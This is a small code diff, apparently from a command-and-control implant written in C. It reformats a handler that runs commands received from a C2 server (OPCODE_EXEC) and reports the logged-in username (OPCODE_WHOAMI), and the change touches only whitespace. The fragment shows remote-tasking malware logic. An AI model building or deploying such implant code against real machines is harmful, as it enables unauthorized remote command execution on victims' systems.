@@ -114,7 +114,8 @@ BOOL DoRegister() {
 // Function to handle the opcode received from the C2 server
 BOOL HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
   switch (tr->Opcode) {
-  case OPCODE_EXEC: {
+    
+    case OPCODE_EXEC: {
     size_t stOut = 0;
     LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
     // warning unsafe for any command that isn't a string
@@ -135,6 +136,7 @@ BOOL HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
 
     break;
   }
+  
   case OPCODE_WHOAMI: {
     char username[MAX_PATH] = {0};
     DWORD dwSize = MAX_PATH;
